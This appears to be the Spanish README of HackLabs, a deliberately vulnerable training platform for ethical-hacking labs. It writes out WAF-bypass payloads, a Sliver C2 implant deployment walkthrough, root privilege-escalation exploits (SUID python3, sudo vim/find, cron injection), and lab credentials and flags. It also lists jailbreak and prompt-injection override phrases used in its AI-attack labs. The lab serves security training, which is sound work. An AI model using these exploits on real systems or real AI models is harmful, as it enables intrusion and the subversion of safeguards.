# HackLabs

<img width="1725" height="997" alt="HackLabs" src="https://github.com/user-attachments/assets/d6a74433-0818-4028-aab2-e4b10336b017" />

<br>
<b>Plataforma de entrenamiento en hacking ético</b>b> — Similar a Mutillidae/DVWA pero con interfaz moderna y guías de explotación. Cubre el <b>OWASP Top 10</b>b completo + vulnerabilidades extra avanzadas.
<br><br>

> ⚠️ **ADVERTENCIA**: Esta aplicación es intencionalmente insegura. Úsala SOLO en entornos aislados (máquina virtual, red local sin internet). Nunca la expongas públicamente.

## Video: Hands On
[![HackLabs Preview](https://github.com/user-attachments/assets/da3054ce-f946-433f-a731-cead61f7d096)](https://www.youtube.com/watch?v=pZFGQj3XrX8)


---

## 🎯 Características

- **27 laboratorios** cubriendo OWASP Top 10 + vulnerabilidades avanzadas + IA Attacks
- Guías de resolución paso a paso (ES/EN)
- Filtros de labs por criticidad (Critical / High / Medium)
- Soporte **bilingüe** (Español / English)
- Interfaz moderna oscura con **Tailwind CSS** + **Phosphor Icons**
- Compatible con **Burp Suite, sqlmap, hydra, nmap, jwt_tool** y demás herramientas de Kali Linux
- **Selector de dificultad** (Easy / Medium / Hard) que modifica las protecciones de cada lab en tiempo real

---

## 🧪 Laboratorios disponibles

### OWASP Top 10 (2021)

| # | Lab | Riesgo | Técnica |
|---|-----|--------|---------|
| A01 | IDOR – Broken Access Control | 🟠 High | `/profile?id=N` sin autenticación |
| A02 | Cryptographic Failures | 🟠 High | Contraseñas MD5 en cookie/respuesta |
| A03 | SQL Injection | 🔴 Critical | UNION-based, error-based, `sqlmap` |
| A03 | Command Injection | 🔴 Critical | Campo ping → RCE |
| A04 | Insecure Design | 🟡 Medium | Preguntas secretas predecibles |
| A05 | Security Misconfiguration | 🟡 Medium | `/admin` sin auth, `.git` expuesto |
| A06 | Outdated Components | 🟡 Medium | jQuery vulnerable con XSS |
| A07 | Auth Failures | 🟠 High | Sin rate-limiting, credenciales por defecto |
| A08 | Integrity Failures | 🟠 High | `PUT /api/user` sin validación de propiedad |
| A09 | Logging Failures | 🟡 Medium | Acciones críticas sin auditoría |
| A10 | SSRF | 🟠 High | `/fetch?url=` → recursos internos |

### Vulnerabilidades

| Lab | Riesgo | Técnica |
|-----|--------|---------|
| C2 – Sliver (Command & Control) | 🔴 Critical | Sliver C2: generar implant, mTLS listener, transferir y ejecutar payloads |
| CORS Misconfiguration | 🟠 High | Reflejo de Origin + Allow-Credentials |
| CSRF – Cross-Site Request Forgery | 🟠 High | Cambio de contraseña sin token |
| File Upload sin restricciones | 🔴 Critical | Subida de webshell sin restricciones |
| Insecure Deserialization | 🔴 Critical | Python `pickle.loads()` → RCE |
| JWT Manipulation | 🟠 High | `alg=none`, secreto débil (hashcat) |
| Login Bruteforce | 🟡 Medium | Hydra, Medusa, CrackMapExec |
| Open Redirect | 🟡 Medium | Parámetro URL sin whitelist |
| Path Traversal / LFI | 🟠 High | `../../etc/passwd` |
| Privilege Escalation (SSH) | 🔴 Critical | SUID, sudo misconfiguration, cron |
| SSTI – Server-Side Template Injection | 🔴 Critical | Jinja2 `render_template_string` → RCE |
| XSS – Cross-Site Scripting | 🟠 High | Reflected, Stored, DOM |
| XXE – XML External Entity | 🟠 High | XML External Entity |

### IA Attacks

| Lab | Riesgo | Técnica |
|-----|--------|---------|
| AI Jailbreak | 🟡 Medium | DAN, roleplay, instruction override |
| Indirect Prompt Injection | 🟠 High | Payload oculto en documento analizado |
| Prompt Injection | 🟠 High | System prompt override, prompt leaking |

---

## Sistema de Dificultad

HackLabs incluye un **selector de dificultad** en la barra de navegación (similar a Mutillidae/DVWA) que ajusta las protecciones de **todos** los laboratorios en tiempo real. La dificultad seleccionada se mantiene entre labs y persiste durante toda la sesión.

| Nivel | Descripción | Color |
|-------|-------------|-------|
| **Easy** | Sin protección — vulnerabilidades completamente expuestas | 🟢 Verde |
| **Medium** | Filtros básicos — bypass posible con técnicas intermedias | 🟡 Ámbar |
| **Hard** | WAF / validación avanzada — requiere técnicas avanzadas de bypass | 🔴 Rojo |

### Detalle por laboratorio

<details>
<summary><strong>A01 — IDOR (Broken Access Control)</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Devuelve **todos** los campos del usuario (incluye `password_md5` y `password_plain`) |
| Medium | Oculta `password_plain` pero expone `password_md5` y `security_answer` |
| Hard | Solo datos básicos: `id`, `username`, `email`, `role` |

</details>

<details>
<summary><strong>A02 — Cryptographic Failures</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Hash MD5 expuesto en cookie sin `HttpOnly` ni salt |
| Medium | Cookie `HttpOnly` pero sigue siendo MD5 sin salt |
| Hard | SHA256 con salt estático `"hacklabs"` + cookie `HttpOnly` + `SameSite` |

</details>

<details>
<summary><strong>A03 — Command Injection</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin filtro — `shell=True` con inyección directa |
| Medium | Filtra `;` y `\|` (bypass: `&&`, newlines `%0a`) |
| Hard | Filtra `;` `\|` `&` `` ` `` `$` `()` `{}` `<` `>` (bypass: `%0a` newline) |

</details>

<details>
<summary><strong>A03 — SQL Injection</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin filtro — inyección SQL directa con errores expuestos |
| Medium | WAF básico bloquea `UNION`, `SELECT`, `DROP`, `INSERT`, `DELETE`, `--` |
| Hard | Regex WAF agresivo `\bunion\b`, `\bselect\b`, `[';]` + errores ocultos |

</details>

<details>
<summary><strong>A04 — Insecure Design (Password Recovery)</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Pregunta secreta visible + sin rate-limiting |
| Medium | Pregunta parcialmente censurada + 5 intentos / 30s |
| Hard | Pregunta oculta + 3 intentos / 60s + errores genéricos |

</details>

<details>
<summary><strong>A05 — Security Misconfiguration</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Panel `/admin` sin autenticación — acceso total |
| Medium | Requiere cookie `is_admin=true` (bypass: editar cookie) |
| Hard | Requiere header `X-Admin-Token: hacklabs-admin-2024` |

</details>

<details>
<summary><strong>A06 — Outdated Components</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin filtro XSS — inyección de tags directa |
| Medium | Filtra `<script>` pero no event handlers ni otros tags |
| Hard | Filtra `<` y `>` (bypass: atributos inline) |

</details>

<details>
<summary><strong>A07 — Authentication Failures</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin rate-limiting — brute force ilimitado |
| Medium | Límite: 10 intentos / 30 segundos |
| Hard | Límite: 5 intentos / 60 segundos + errores genéricos |

</details>

<details>
<summary><strong>A08 — Software & Data Integrity Failures</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Campo `role` editable vía API + todos los campos visibles |
| Medium | `role` bloqueado en PUT + vista sin campo role |
| Hard | Solo `email` editable + requiere header Authorization + vista mínima |

</details>

<details>
<summary><strong>A09 — Security Logging & Monitoring Failures</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin logging — el atacante es invisible |
| Medium | Solo registra logins exitosos con IP (fallos invisibles) |
| Hard | Registra éxitos y fallos pero sin IP (auditoría incompleta) |

</details>

<details>
<summary><strong>A10 — SSRF</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin filtro — SSRF a servicios internos directamente |
| Medium | Bloquea `localhost`, `127.0.0.1` (bypass: IP decimal, 0x7f000001) |
| Hard | Bloquea rangos privados (bypass: DNS rebinding, IPv6) |

</details>

<details>
<summary><strong>C2 — Sliver (Command & Control)</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| **Easy** | Servidor Sliver en la máquina atacante, generación y ejecución directa del implant en la víctima. `sliver` acepta conexiones mTLS y las sesiones aparecen con `sliver > sessions`. |
| **Medium** | Implant empaquetado/obfuscado; ejecución en la víctima necesita permisos de usuario; conexiones salientes restringidas parcialmente (filtrado o proxy). Se requiere generar el implant con la IP y arquitectura correctas (`--mtls {{ client_ip }}:443 --os linux --arch amd64`). |
| **Hard** | Detección por EDR/WAF: ejecución bloqueada, monitorización de procesos y restricciones de red. Requiere técnicas de evasión: ejecución en memoria, migración de procesos, uso de scripts o staged payloads y técnicas de persistencia manuales. |

```bash
# En Kali (atacante)
curl -sSL https://sliver.sh/install | sudo bash
sliver
sliver > generate --mtls {{ client_ip }}:443 --os linux --arch amd64
sliver > mtls --lport 443

# Transferir al objetivo y ejecutar
scp /home/kali/IMPLANT_NAME admin@TARGET_IP:/tmp/
ssh admin@TARGET_IP
cd /tmp && ./IMPLANT_NAME

# En Sliver
sliver > sessions
sliver > use <ID>
sliver (ID) > ps
```

> Nota: `IMPLANT_NAME` se sustituye por el nombre del binario generado; `{{ client_ip }}` se autocompleta desde la plantilla en el entorno web. Usa este desplegable para ver los pasos rápidos del lab C2.

</details>

<details>
<summary><strong>CORS Misconfiguration</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Refleja cualquier Origin + `Access-Control-Allow-Credentials: true` |
| Medium | Solo permite orígenes `*.hacklabs.local` (bypass: subdominio) |
| Hard | Regex estricto (bypass: prefijo de dominio similar) |

</details>

<details>
<summary><strong>CSRF</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin protección CSRF + todos los campos del perfil visibles |
| Medium | Verificación de header `Referer` (bypass: supresión/manipulación) |
| Hard | Requiere header `X-CSRF-Token` en sesión (bypass: XSS para robar token) |

</details>

<details>
<summary><strong>File Upload</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin validación — cualquier archivo con nombre original |
| Medium | Blacklist de extensiones peligrosas (bypass: doble extensión `.php.jpg`) |
| Hard | Whitelist + verificación Content-Type (bypass: magic bytes) |

</details>

<details>
<summary><strong>Insecure Deserialization</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | `pickle.loads()` directo del input del usuario |
| Medium | Blacklist de keywords (`os`, `subprocess`, `system`, `popen`...) |
| Hard | Bloqueo de opcodes peligrosos de pickle (`R`, `i`, `c`, `0x81`) |

</details>

<details>
<summary><strong>JWT Manipulation</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Acepta `alg=none` + secreto expuesto en la interfaz |
| Medium | Rechaza `alg=none` pero secreto débil (bypass: brute force con hashcat) |
| Hard | Rechaza `alg=none` + secreto fuerte (bypass: kid injection, jwt_tool) |

</details>

<details>
<summary><strong>Login Bruteforce (HTTP + FTP)</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin rate-limiting — intentos ilimitados |
| Medium | Límite: 5 intentos / 30 segundos |
| Hard | Límite: 3 intentos / 60 segundos (+ delay de 1s en FTP) |

</details>

<details>
<summary><strong>Open Redirect</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin validación — redirección a cualquier URL |
| Medium | Bloquea `http://` y `https://` externos (bypass: `//evil.com`, `/\evil.com`) |
| Hard | Bloquea dominios externos + protocol-relative `//` (bypass: `/\evil.com` — browser normaliza `\` a `/`) |

</details>

<details>
<summary><strong>Path Traversal / LFI</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin filtro — `../` traversal directo |
| Medium | Filtra `../` una sola vez (bypass: `....//` doble traversal) |
| Hard | Filtra `../` y `..\` recursivamente |

</details>

<details>
<summary><strong>Privilege Escalation (SSH)</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | SUID en python3 + sudo sin restricciones disponibles |
| Medium | Sudo misconfiguration (vim, find) |
| Hard | Cron job world-writable |

</details>

<details>
<summary><strong>SSTI — Server-Side Template Injection</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin filtro — inyección Jinja2 directa `{{ 7*7 }}` |
| Medium | Bloquea `{{ }}` (bypass: `{% print 7*7 %}`) |
| Hard | Bloquea `{{ }}`, `{% %}` y keywords peligrosos |

</details>

<details>
<summary><strong>XSS — Reflected / Stored / DOM</strong></summary>

**Reflected & Stored:**

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin filtro — inyección XSS directa |
| Medium | Filtra `<script>` (bypass: event handlers `onerror`, `onload`) |
| Hard | Filtra `<` y `>` — XSS bloqueado |

**DOM XSS:**

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin filtro — `innerHTML` con input del usuario directo |
| Medium | JS filtra `<script>` tags (bypass: `<img onerror>`, `<svg onload>`) |
| Hard | JS filtra tags peligrosos + `on*=` handlers + `javascript:` (bypass: HTML entities `&#106;avascript:`) |

</details>

<details>
<summary><strong>XXE — XML External Entity</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin protección XXE — `resolve_entities` habilitado |
| Medium | Bloquea protocolo `file://` (bypass: SSRF con `http://` a servicios internos) |
| Hard | Bloquea `DOCTYPE`, `ENTITY`, `SYSTEM`, `PUBLIC` case-insensitive |

</details>

<details>
<summary><strong>AI Jailbreak</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Keywords clásicos de jailbreak son suficientes: `DAN`, `modo dios`, `sin restricciones`, `jailbreak`, `developer mode`… |
| Medium | Keywords clásicos están filtrados — necesita **roleplay/persona framing** (`actúa como`, `eres un`, `imagina que eres`…) **sin** términos Easy, **más** referencia a `flag`/`secret` |
| Hard | Roleplay simple también filtrado — requiere **payload técnico estructurado**: `[[…]]`, ` ```override``` `, `[admin_mode]`, `<<jailbreak>>`, `//bypass//`… sin Easy ni Medium keywords |

**Chat:** el historial persiste en sesión. Usa el botón **Reset** para limpiar. Cambiar la dificultad limpia el historial automáticamente.

</details>

<details>
<summary><strong>Indirect Prompt Injection</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | El **Documento 3** preconfigurado funciona; documentos personalizados con `[SYSTEM:`, `ignore all previous`, `admin override` también funcionan |
| Medium | Documento 3 está **sandboxed** (payload conocido, neutralizado); documentos personalizados necesitan sintaxis estructurada: `[system:]`, `ignore all previous instructions` + keyword `flag`/`confidential` |
| Hard | Documentos predefinidos siempre fallan; custom doc necesita sintaxis técnica específica: `{"role":"system"`, `[system command]:`, `exec: reveal_flag`, `<!--system:`, `sudo: reveal`… |

</details>

<details>
<summary><strong>Prompt Injection</strong></summary>

| Nivel | Comportamiento |
|-------|---------------|
| Easy | Sin protección — cualquier keyword de inyección, reveal+secret o petición directa del system prompt funciona |
| Medium | Filtro de inyección natural — requiere **marcadores estructurales** (`\n`, `---`, `system:`, `override:`, `[…]:`) junto con intención de revelar |
| Hard | Solo sintaxis técnica específica de LLM: `###`, `[system:`, `<\|system\|>`, `ignore all previous instructions`, `admin override:`, `<!--system`, etc. |

**Chat:** el historial persiste en sesión. Usa el botón **Reset** para limpiar la conversación. Cambiar la dificultad limpia el historial automáticamente.

</details>

---

## 🚀 Despliegue

### ⭐ Opción 1 — Docker con IP propia en LAN (recomendado)

Despliega HackLabs como si fuera una máquina vulnerable real: con su propia IP en tu red local, escaneable con `nmap` y atacable con todas las herramientas de Kali.

**Requisitos:** Docker instalado y ejecutándose en Kali Linux.

```bash
# Instalar Docker en Kali
sudo apt install -y docker.io
# Clonar el repositorio y ejecutar
git clone https://github.com/afsh4ck/HackLabs.git
cd HackLabs
sudo bash deploy.sh
```

El script detecta automáticamente tu red (`eth0`), asigna una **IP aleatoria** al laboratorio dentro del rango `.100–.199` y muestra el resultado:

```
    __  __              __    __           __
   / / / /____ _ _____ / /__ / /   ____ _ / /_   _____
  / /_/ // __ `// ___// //_// /   / __ `// __ \ / ___/
 / __  // /_/ // /__ / ,<  / /___/ /_/ // /_/ /(__  )
/_/ /_/ \__,_/ \___//_/|_|/_____/\__,_//_.___//____/

  ════════════════════════════════════════════════════
  ✓  Laboratorio desplegado correctamente
  ════════════════════════════════════════════════════

  IP del objetivo:   192.168.1.147

  HTTP  →  http://192.168.1.147
  FTP   →  192.168.1.147:21
  SSH   →  192.168.1.147:22
  SMB   →  192.168.1.147:445

  nmap -sV -p 21,22,80,445 192.168.1.147

  Presiona Ctrl+C para detener el laboratorio
```

Pulsa **Ctrl+C** para detener y eliminar el contenedor automáticamente.

> **Nota:** El script necesita `sudo` para crear la red macvlan (interfaz de red propia). El puerto 445 (SMB) puede estar ocupado en Windows; en Linux/Docker funciona correctamente.

---

### Opción 2 — Local sin Docker (desarrollo / pruebas rápidas)

**Requisitos:** Python 3.8+

```bash
git clone https://github.com/afsh4ck/HackLabs.git
cd HackLabs

# Instalación automática
chmod +x setup.sh && ./setup.sh

# O manual:
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
python init_db.py
python app.py
```

Accede en: **http://localhost**

---

## 🔑 Credenciales de prueba

| Usuario | Contraseña | Hash MD5 | Rol |
|---------|-----------|----------|-----|
| admin | password1 | `7c6a180b36896a0a8c02787eeafb0e4c` | admin |
| alice | Password1 | `2ac9cb7dc02b3c0083eb70898e549b63` | user |
| bob | welcome1 | `201f00b5ca5d65a1c118e5e32431514c` | user |
| charlie | changeme | `4cb9c8a8048fd02294477fcb1a41191a` | user |
| dave | P@ssw0rd | `161ebd7d45089b3446ee4e0d86dbcf92` | manager |

---

## 🚩 Flags del laboratorio de Bruteforce

El lab de Bruteforce expone servicios reales con flags CTF. Encuéntralas tras autenticarte:

| Servicio | Cómo obtenerla | Flag |
|----------|---------------|------|
| **HTTP** | Login web exitoso con hydra/Burp | `HL{http_brut3f0rc3_w3b_l0gin_succ3ss}` |
| **SSH** | `ssh admin@TARGET_IP` → `cat user.txt` | `HL{ssh_brut3f0rc3_l0gin_succ3ss}` |
| **FTP** | `ftp admin@TARGET_IP` → `get ftp_flag.txt` | `HL{ftp_cr3d3nti4ls_r3us3d}` |
| **SMB** | `smbclient //TARGET_IP/hacklabs -U admin` → `get flag.txt` | `HL{smb_sh4r3_3num3r4ti0n_succ3ss}` |
| **SMB (admin_backup)** | `smbclient //TARGET_IP/admin_backup -U admin` → `get root.txt` | `HL{4dm1n_b4ckup_3xf1ltr4ti0n}` |
| **SSH — root** | Escalada de privilegios desde cualquier usuario SSH | `HL{r00t_pr1v3sc_succ3ss}` |

### Acceso a los servicios tras bruteforce

```bash
# SSH
ssh admin@TARGET_IP          # password: password1
cat user.txt

# FTP
ftp TARGET_IP                 # user: admin / password: password1
get ftp_flag.txt

# SMB — enumerar shares
smbmap -H TARGET_IP -u admin -p 'password1'

# SMB — leer flags
smbclient //TARGET_IP/hacklabs -U admin%password1 -c 'get flag.txt /tmp/flag.txt'
smbclient //TARGET_IP/admin_backup -U admin%password1 -c 'get root.txt /tmp/root.txt'
cat /tmp/flag.txt
cat /tmp/root.txt
```

---
## 🔺 Escalada de Privilegios (SSH)

Cada usuario SSH tiene un vector de escalada diferente. El objetivo final es leer `/root/root.txt` (`HL{r00t_pr1v3sc_succ3ss}`).

> `admin` tiene `sudo` completo para que puedas inspeccionar la máquina (permisos SUID, sudoers, crons...) y validar los vectores del resto de usuarios.

| Usuario | Contraseña | Vector | Técnica |
|---------|-----------|--------|---------|
| `admin` | `password1` | `sudo` sin restricciones | `sudo su` / `sudo bash` |
| `alice` | `Password1` | **SUID en python3** | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `bob` | `welcome1` | **sudo misconfiguration** → `vim` | `sudo vim -c ':!/bin/bash'` |
| `charlie` | `changeme` | **Cron job world-writable** | Inyectar payload en `/opt/scripts/cleanup.sh` |
| `dave` | `P@ssw0rd` | **sudo misconfiguration** → `find` | `sudo find . -exec /bin/bash \; -quit` |

### 💣 Exploits paso a paso

<details>
<summary><strong>admin — sudo completo</strong></summary>

```bash
ssh admin@TARGET_IP   # password: password1
sudo su               # → root
cat /root/root.txt
```

> Usa `admin` para reconocimiento: `sudo cat /etc/sudoers.d/*`, `find / -perm -4000 2>/dev/null`, `cat /etc/cron.d/*`.

</details>

<details>
<summary><strong>alice — SUID python3</strong></summary>

```bash
ssh alice@TARGET_IP   # password: Password1

# Verificar SUID
find / -perm -4000 -type f 2>/dev/null | grep python
# → /usr/bin/python3

# Escalar
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id    # uid=0(root)
cat /root/root.txt
```

</details>

<details>
<summary><strong>bob — sudo vim</strong></summary>

```bash
ssh bob@TARGET_IP    # password: welcome1

# Verificar sudo
sudo -l
# → (ALL) NOPASSWD: /usr/bin/vim

# Escalar via GTFOBins
sudo vim -c ':!/bin/bash'
id    # uid=0(root)
cat /root/root.txt
```

</details>

<details>
<summary><strong>charlie — Cron job world-writable</strong></summary>

```bash
ssh charlie@TARGET_IP   # password: changeme

# Pista en el home
cat note.txt
# → Tip: check what runs automatically on this system...

# Descubrir el cron
cat /etc/cron.d/maintenance
# → * * * * * root /opt/scripts/cleanup.sh

# El script es escribible por todos
ls -la /opt/scripts/cleanup.sh
# → -rwxrwxrwx root root

# Inyectar payload (copia bash con SUID)
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh

# Esperar 1 minuto y escalar
/tmp/rootbash -p
id    # euid=0(root)
cat /root/root.txt
```

</details>

<details>
<summary><strong>dave — sudo find</strong></summary>

```bash
ssh dave@TARGET_IP   # password: P@ssw0rd

# Verificar sudo
sudo -l
# → (ALL) NOPASSWD: /usr/bin/find

# Escalar via GTFOBins
sudo find . -exec /bin/bash \; -quit
id    # uid=0(root)
cat /root/root.txt
```

</details>

---
## 🛠️ Herramientas compatibles

Todos los labs están diseñados para ser explotados con herramientas nativas de **Kali Linux**:

```
Burp Suite · sqlmap · hydra · medusa · ncrack · crackmapexec
tplmap · jwt_tool · hashcat · john · curl · ffuf · nikto
wfuzz · gobuster · metasploit · nmap
```

---

## 📁 Estructura del proyecto

```
HackLabs/
├── app.py                  # Aplicación Flask principal
├── init_db.py              # Inicialización de la base de datos
├── requirements.txt        # Dependencias Python
├── setup.sh                # Instalación local automática
├── deploy.sh               # Despliegue con Docker
├── Dockerfile              # Imagen Docker
├── docker-compose.yml      # Compose con macvlan (IP propia en LAN)
├── entrypoint.sh           # Entrypoint: muestra banner + IP al arrancar
├── .dockerignore           # Excluye archivos innecesarios del build
├── hacklabs.db             # Base de datos SQLite (generada)
├── static/
│   ├── css/style.css       # Estilos CSS + variables de color
│   ├── js/main.js          # JS: i18n, sidebar, highlight, modal
│   ├── files/              # Archivos para path traversal
│   └── uploads/            # Subidas de archivos (file upload lab)
└── templates/
    ├── base.html           # Layout base con sidebar + navbar
    ├── index.html          # Home con tarjetas de labs y filtros
    ├── _lab_header.html    # Cabecera reutilizable de cada lab
    └── labs/               # 26 templates individuales de labs
```

---

## ⚙️ Variables de configuración

Edita `app.py` para cambiar:

```python
app.secret_key = 'hacklabs-insecure-key'   # No cambiar (intencional)
DATABASE = 'hacklabs.db'
UPLOAD_FOLDER = 'static/uploads'
JWT_SECRET = 'secret123'                    # Secreto débil intencional
```

---

## 🎓 Uso recomendado

1. Despliega HackLabs en una **máquina virtual Kali Linux** con red NAT/solo-anfitrión
2. Accede desde el navegador o desde la máquina host
3. Abre Burp Suite como proxy (127.0.0.1:8080)
4. Selecciona un laboratorio, lee la descripción y explota la vulnerabilidad
5. Pulsa **"Ver resolución"** para ver la guía paso a paso si te quedas atascado

---

## 📸 Screenshots

![hacklabs-owasp](https://github.com/user-attachments/assets/1ff26dae-6b4b-48d1-8014-c86748b3cf92)
![hacklabs-vulns](https://github.com/user-attachments/assets/6fcc3325-eb78-4668-81cc-b0a37a18e9e9)
![hacklabs-ia](https://github.com/user-attachments/assets/4783ff29-6f58-4db0-bd1b-3d29b4dc84b0)

---

## 📄 Licencia

MIT License — Uso libre para fines educativos.

---

<div align="center">
  <strong>Made with ❤️ by <a href="https://www.instagram.com/afsh4ck/">afsh4ck</a></strong><br/>
  <a href="https://h4ckercademy.com/">Hacking Academy</a>
</div>
